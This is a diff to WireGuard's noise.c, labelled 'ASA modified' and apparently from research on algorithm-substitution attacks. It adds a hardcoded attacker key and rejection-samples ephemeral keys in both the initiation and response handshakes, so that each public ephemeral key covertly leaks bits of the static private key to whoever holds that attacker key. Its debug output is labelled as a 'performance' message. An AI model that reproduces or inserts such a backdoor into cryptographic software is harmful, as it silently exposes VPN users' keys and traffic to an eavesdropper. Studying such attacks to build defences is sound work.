diff --git a/src/noise.c b/src/noise.c
index baf455e..1705144 100644
--- a/src/noise.c
+++ b/src/noise.c
@@ -17,6 +17,15 @@
 #include <linux/highmem.h>
 #include <crypto/algapi.h>
 
+//******** ASA modified **********************************************************************************************//
+#define NUMBER_OF_BITS 2
+//#define REJECTION_SAMPLING_ON_INIT
+#define REJECTION_SAMPLING_ON_RESPONSE
+#define PRINT_TRIES
+const u8 attackerKey_rs[16] = {0x12, 0x23, 0x34, 0x45, 0x56, 0x67, 0x78, 0x89,
+                               0x99, 0x9a, 0xab, 0xbc, 0xcd, 0xde, 0xef, 0xff};
+//********************************************************************************************************************//
+
 /* This implements Noise_IKpsk2:
  *
  * <- s
@@ -484,11 +493,15 @@ static void tai64n_now(u8 output[NOISE_TIMESTAMP_LEN])
 
 bool
 wg_noise_handshake_create_initiation(struct message_handshake_initiation *dst,
-				     struct noise_handshake *handshake)
-{
+				     struct noise_handshake *handshake) {
     u8 timestamp[NOISE_TIMESTAMP_LEN];
     u8 key[NOISE_SYMMETRIC_KEY_LEN];
     bool ret = false;
+#ifdef REJECTION_SAMPLING_ON_INIT
+    //******** ASA modified ******************************************************************************************//
+    u32 counter;
+    //****************************************************************************************************************//
+#endif
 
     /* We need to wait for crng _before_ taking any locks, since
      * curve25519_generate_secret uses get_random_bytes_wait.
@@ -507,10 +520,37 @@ wg_noise_handshake_create_initiation(struct message_handshake_initiation *dst,
                    handshake->remote_static);
 
     /* e */
+#ifdef REJECTION_SAMPLING_ON_INIT
+    //******** ASA modified ******************************************************************************************//
+    for (counter = 0; counter < ((1<<NUMBER_OF_BITS)*128); counter++) {
+        curve25519_generate_secret(handshake->ephemeral_private);
+        if (!curve25519_generate_public(dst->unencrypted_ephemeral,
+                                        handshake->ephemeral_private))
+            goto out;
+        blake2s(key, dst->unencrypted_ephemeral, attackerKey_rs, 2, 32, 16);
+#if NUMBER_OF_BITS == 8
+        if (key[1]  == handshake->static_identity->static_private[key[0] & 0x1f])
+#elif NUMBER_OF_BITS == 4
+        if ((key[1] & 0x0f) == ((handshake->static_identity->static_private[(key[0] >> 1) & 0x1f] >> (4 * (1 - (key[0] & 0x1)))) & 0x0f))
+#elif NUMBER_OF_BITS == 2
+        if ((key[1] & 0x03) == ((handshake->static_identity->static_private[(key[0] >> 2) & 0x1f] >> (2 * (3 - (key[0] & 0x3)))) & 0x03))
+#elif NUMBER_OF_BITS == 1
+        if ((key[1] & 0x01) == ((handshake->static_identity->static_private[(key[0] >> 3) & 0x1f] >> (7 - (key[0] & 0x7))) & 0x01))
+#endif
+            break;
+    }
+#ifdef PRINT_TRIES
+    printk(KERN_ALERT "WireGuard performance (init_tries): Tries=%i\n", counter);
+#endif
+#else
+    //******** Original code *****************************************************************************************//
     curve25519_generate_secret(handshake->ephemeral_private);
     if (!curve25519_generate_public(dst->unencrypted_ephemeral,
                                     handshake->ephemeral_private))
         goto out;
+    //****************************************************************************************************************//
+#endif
+
     message_ephemeral(dst->unencrypted_ephemeral,
 			  dst->unencrypted_ephemeral, handshake->chaining_key,
 			  handshake->hash);
@@ -638,6 +678,11 @@ bool wg_noise_handshake_create_response(struct message_handshake_response *dst,
 {
 	u8 key[NOISE_SYMMETRIC_KEY_LEN];
 	bool ret = false;
+#ifdef REJECTION_SAMPLING_ON_RESPONSE
+    //******** ASA modified ******************************************************************************************//
+    u32 counter;
+    //****************************************************************************************************************//
+#endif
 
 	/* We need to wait for crng _before_ taking any locks, since
 	 * curve25519_generate_secret uses get_random_bytes_wait.
@@ -654,10 +699,36 @@ bool wg_noise_handshake_create_response(struct message_handshake_response *dst,
 	dst->receiver_index = handshake->remote_index;
 
 	/* e */
+#ifdef REJECTION_SAMPLING_ON_RESPONSE
+    //******** ASA modified ******************************************************************************************//
+    for (counter = 0; counter < ((1<<NUMBER_OF_BITS)*128); counter++) {
+        curve25519_generate_secret(handshake->ephemeral_private);
+        if (!curve25519_generate_public(dst->unencrypted_ephemeral,
+                                        handshake->ephemeral_private))
+            goto out;
+        blake2s(key, dst->unencrypted_ephemeral, attackerKey_rs, 2, 32, 16);
+#if NUMBER_OF_BITS == 8
+        if (key[1]  == handshake->static_identity->static_private[key[0] & 0x1f])
+#elif NUMBER_OF_BITS == 4
+        if ((key[1] & 0x0f) == ((handshake->static_identity->static_private[(key[0] >> 1) & 0x1f] >> (4 * (1 - (key[0] & 0x1)))) & 0x0f))
+#elif NUMBER_OF_BITS == 2
+        if ((key[1] & 0x03) == ((handshake->static_identity->static_private[(key[0] >> 2) & 0x1f] >> (2 * (3 - (key[0] & 0x3)))) & 0x03))
+#elif NUMBER_OF_BITS == 1
+            if ((key[1] & 0x01) == ((handshake->static_identity->static_private[(key[0] >> 3) & 0x1f] >> (7 - (key[0] & 0x7))) & 0x01))
+#endif
+            break;
+    }
+#ifdef PRINT_TRIES
+    printk(KERN_ALERT "WireGuard performance (response_tries): Tries=%i\n", counter);
+#endif
+#else
+    //******** Original code *****************************************************************************************//
     curve25519_generate_secret(handshake->ephemeral_private);
 	if (!curve25519_generate_public(dst->unencrypted_ephemeral,
 					handshake->ephemeral_private))
 		goto out;
+    //****************************************************************************************************************//
+#endif
 	message_ephemeral(dst->unencrypted_ephemeral,
 			  dst->unencrypted_ephemeral, handshake->chaining_key,
 			  handshake->hash);
